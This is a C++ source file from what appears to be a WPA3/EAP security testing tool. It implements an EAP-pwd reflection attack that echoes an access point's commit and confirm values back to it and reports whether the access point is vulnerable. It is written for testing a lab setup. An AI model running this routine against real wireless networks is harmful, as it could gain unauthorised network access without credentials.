#include <nlohmann/json.hpp>
#include <tins/hw_address.h>

#include "attacks/Enterprise/eap_defs.h"
#include "attacks/Enterprise/eap_helper.h"
#include "attacks/mc_mitm/MonitorSocket.h"
#include "config/RunStatus.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "setup/program.h"
#include "system/ip.h"
#include "system/utils.h"

using namespace std;
using namespace chrono;
using namespace filesystem;
using namespace Tins;

namespace wpa3_tester::reflection{
bool run_reflection_exchange(EAP_Att &eap_att){
	if(!do_auth(eap_att)) return false;
	if(!do_assoc(eap_att)) return false;

	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
	// returns nullopt on timeout or interrupt.

	if(send_eap_normal_EAP(eap_att)) return false;
	if(send_eap_normal_EAP_pwd_ID(eap_att)) return false;

	// COMMIT
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t> &e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == eap::PWD_OPCODE_COMMIT){
				frame = f;
				return true;
			}
			return false;
		});
		if(!eapol){
			log(LogLevel::WARNING, "EAP commit ended without success");
			return false;
		}
		log(LogLevel::INFO, "EAP-PWD-Commit Request – reflecting scalar+element");
		send_eapol(eap_att, reflect_commit(*frame));
	}

	// CONFIRM
	{
		optional<EapPwdFrame> frame;
		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t> &e){
			const auto f = parse_eap_pwd(e);
			if(f && f->opcode == eap::PWD_OPCODE_CONFIRM){
				frame = f;
				return true;
			}
			return false;
		});
		if(!eapol){
			log(LogLevel::WARNING, "EAP confirm exchange ended without success");
			return false;
		}
		log(LogLevel::INFO, "EAP-PWD-Confirm Request – reflecting confirm value");
		send_eapol(eap_att, reflect_confirm(*frame));
	}

	return eap_pwd_wait_for_success(eap_att);
}

void setup_attack(RunStatus &rs){
	copy_f(rs.config_path().parent_path() / "config/hostapd.eap_user", rs.run_folder() / "hostapd.eap_user");

	program::start(rs, "access_point");
	if(rs.get_actor("access_point").get(SK::source) == "internal")
		rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(40));
	log(LogLevel::INFO, "access_point running");
	ip::set_ip(rs, "access_point");
}

void run_attack(RunStatus &rs){
	rs.start_observers();
	const auto &att_cfg = rs.config().at("attack_config");
	const auto attacker = rs.get_actor("attacker");
	const auto ap_actor = rs.get_actor("access_point");

	const string identity = att_cfg.at("identity").get<string>();
	const string ssid = ap_actor->get(SK::ssid);

	MonitorSocket sock(attacker.get(SK::iface), attacker.get(SK::netns)); // attacker need to be in netns
	EAP_Att eap_att{sock, ap_actor->get_channel(), attacker.get(SK::mac), ap_actor.get(SK::mac), ssid, identity, 30s};
	this_thread::sleep_for(seconds(3)); //FIXME needed for tshark setup?
	const bool vulnerable = run_reflection_exchange(eap_att);

	rs.save_result({{"passed", vulnerable}});
	log(LogLevel::INFO, "Reflection attack result: {}", vulnerable ? "VULNERABLE" : "not vulnerable");
}
}